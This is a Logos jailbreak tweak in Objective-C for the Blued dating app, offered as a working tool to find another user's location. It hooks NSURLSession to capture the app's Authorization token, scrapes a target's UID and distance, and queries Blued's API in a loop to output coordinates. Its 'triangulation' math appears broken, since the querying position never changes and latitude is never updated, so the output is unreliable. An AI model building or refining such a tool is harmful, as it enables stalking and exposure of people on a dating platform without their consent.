#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <math.h>
#import <objc/runtime.h>

// 1. 常量定义
#define TRACK_BTN_TAG 100001
#define EARTH_RADIUS_KM 111.32
#define BLUED_BUNDLE_ID @"com.bluecity.blued"

// 2. 全局静态变量
static NSString *g_bluedBasicToken = nil;
static NSString *g_currentTargetUid = nil;
static double g_initialDistance = -1.0;

// 3. 接口扩展声明
@interface UIViewController (TrackHook)
- (UIWindow *)th_getSafeKeyWindow;
- (void)th_autoFetchUserInfo;
- (void)th_onBtnClick;
- (void)th_addBtn;
- (void)th_handlePan:(UIPanGestureRecognizer *)pan;
@end

%hook UIViewController

// 【核心修复】解决 iOS 16 找不到 Window 的问题
%new
- (UIWindow *)th_getSafeKeyWindow {
    UIWindow *foundWindow = nil;
    if (@available(iOS 13.0, *)) {
        for (UIScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if (scene.activationState == UISceneActivationStateForegroundActive && [scene isKindOfClass:[UIWindowScene class]]) {
                UIWindowScene *windowScene = (UIWindowScene *)scene;
                for (UIWindow *window in windowScene.windows) {
                    if (window.isKeyWindow) {
                        foundWindow = window;
                        break;
                    }
                }
            }
        }
    }
    return foundWindow ?: [UIApplication sharedApplication].keyWindow;
}

// 【定位算法】三点定位递归收敛逻辑
%new
- (void)th_onBtnClick {
    // 防闪退检查
    if (!self || (uintptr_t)self < 0x100) return;

    [self th_autoFetchUserInfo];
    
    if (!g_currentTargetUid || !g_bluedBasicToken) {
        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"未就绪" 
                                                                       message:@"未抓取到UID或Token\n请进入目标主页并尝试刷新页面" 
                                                                preferredStyle:UIAlertControllerStyleAlert];
        [alert addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleCancel handler:nil]];
        [self presentViewController:alert animated:YES completion:nil];
        return;
    }

    NSUserDefaults *ud = [[NSUserDefaults alloc] initWithSuiteName:BLUED_BUNDLE_ID];
    double myLat = [ud doubleForKey:@"current_latitude"];
    double myLng = [ud doubleForKey:@"current_longitude"];
    
    if (myLat == 0) {
        [self th_showToast:@"本地GPS数据为空" duration:2.0];
        return;
    }

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        double cLat = myLat, cLng = myLng, cDist = g_initialDistance;
        
        // 递归 10 次提高精度
        for (int i=0; i<10; i++) {
            NSString *urlStr = [NSString stringWithFormat:@"https://argo.blued.cn/users/%@/basic", g_currentTargetUid];
            NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlStr]];
            [req setValue:[NSString stringWithFormat:@"Basic %@", g_bluedBasicToken] forHTTPHeaderField:@"Authorization"];
            req.timeoutInterval = 2.5;

            __block double nDist = -1.0;
            dispatch_semaphore_t sem = dispatch_semaphore_create(0);
            [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
                if (data) {
                    NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                    if (json && json[@"data"]) nDist = [json[@"data"][@"distance"] doubleValue];
                }
                dispatch_semaphore_signal(sem);
            }] resume];
            dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.0 * NSEC_PER_SEC)));

            if (nDist < 0) break;
            double oLng = cLng + (cDist / (EARTH_RADIUS_KM * cos(cLat * M_PI/180)));
            cLng = (cLng + oLng) / 2.0;
            cDist = (cDist + nDist) / 2.0;
        }

        dispatch_async(dispatch_get_main_queue(), ^{
            NSString *resStr = [NSString stringWithFormat:@"目标UID: %@\n纬度: %.6f\n经度: %.6f", g_currentTargetUid, cLat, cLng];
            UIAlertController *resAlert = [UIAlertController alertControllerWithTitle:@"计算结果" message:resStr preferredStyle:UIAlertControllerStyleAlert];
            [resAlert addAction:[UIAlertAction actionWithTitle:@"复制坐标" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
                [UIPasteboard generalPasteboard].string = [NSString stringWithFormat:@"%.6f,%.6f", cLat, cLng];
            }]];
            [resAlert addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [self presentViewController:resAlert animated:YES completion:nil];
        });
    });
}

// 【属性抓取】暴力遍历兼容所有混淆版本
%new
- (void)th_autoFetchUserInfo {
    @try {
        unsigned int count = 0;
        objc_property_t *props = class_copyPropertyList([self class], &count);
        for (int i = 0; i < count; i++) {
            NSString *propName = [NSString stringWithUTF8String:property_getName(props[i])];
            id val = [self valueForKey:propName];
            if (!val) continue;

            if ([val respondsToSelector:NSSelectorFromString(@"uid")] || [val respondsToSelector:NSSelectorFromString(@"user_id")]) {
                g_currentTargetUid = [NSString stringWithFormat:@"%@", [val valueForKey:@"uid"] ?: [val valueForKey:@"user_id"]];
                if ([val respondsToSelector:NSSelectorFromString(@"distance")]) {
                    g_initialDistance = [[val valueForKey:@"distance"] doubleValue];
                }
                break;
            }
        }
        free(props);
    } @catch (NSException *e) {}
}

// 【UI 注入】强制置顶显示
%new
- (void)th_addBtn {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *win = [self th_getSafeKeyWindow];
        if (!win || [win viewWithTag:TRACK_BTN_TAG]) return;

        UIButton *btn = [UIButton buttonWithType:UIButtonTypeCustom];
        btn.tag = TRACK_BTN_TAG;
        btn.frame = CGRectMake(win.bounds.size.width - 70, win.bounds.size.height / 2, 56, 56);
        btn.backgroundColor = [UIColor colorWithRed:0 green:0.5 blue:1.0 alpha:0.9];
        [btn setTitle:@"🛰️" forState:UIControlStateNormal];
        btn.titleLabel.font = [UIFont systemFontOfSize:26];
        btn.layer.cornerRadius = 28;
        btn.layer.zPosition = 10000; // 强制最顶层
        
        // 阴影装饰
        btn.layer.shadowColor = [UIColor blackColor].CGColor;
        btn.layer.shadowOffset = CGSizeMake(0, 3);
        btn.layer.shadowOpacity = 0.4;

        [btn addTarget:self action:@selector(th_onBtnClick) forControlEvents:UIControlEventTouchUpInside];
        
        UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(th_handlePan:)];
        [btn addGestureRecognizer:pan];
        
        [win addSubview:btn];
    });
}

%new
- (void)th_handlePan:(UIPanGestureRecognizer *)pan {
    UIView *v = pan.view;
    CGPoint p = [pan translationInView:v.superview];
    v.center = CGPointMake(v.center.x + p.x, v.center.y + p.y);
    [pan setTranslation:CGPointZero inView:v.superview];
}

%new
- (void)th_showToast:(NSString *)msg duration:(NSTimeInterval)dur {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *win = [self th_getSafeKeyWindow];
        UILabel *lab = [[UILabel alloc] initWithFrame:CGRectMake(0,0,200,50)];
        lab.center = CGPointMake(win.bounds.size.width/2, win.bounds.size.height * 0.7);
        lab.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.8];
        lab.textColor = [UIColor whiteColor];
        lab.textAlignment = NSTextAlignmentCenter;
        lab.text = msg;
        lab.layer.cornerRadius = 10;
        lab.clipsToBounds = YES;
        [win addSubview:lab];
        [UIView animateWithDuration:0.5 delay:dur options:0 animations:^{ lab.alpha = 0; } completion:^(BOOL f){ [lab removeFromSuperview]; }];
    });
}

// 【生命周期 Hook】
- (void)viewDidAppear:(BOOL)animated {
    %orig;
    // 强制尝试添加按钮（th_addBtn 内部已包含逻辑：如果已存在则不创建）
    [self th_addBtn];
}
%end

// 4. Token 捕获 Hook
%hook NSURLSession
- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData *data, NSURLResponse *res, NSError *err))completionHandler {
    if (request && request.allHTTPHeaderFields[@"Authorization"]) {
        NSString *auth = request.allHTTPHeaderFields[@"Authorization"];
        if ([auth hasPrefix:@"Basic "]) {
            g_bluedBasicToken = [[auth substringFromIndex:6] copy];
        }
    }
    return %orig(request, completionHandler);
}
%end
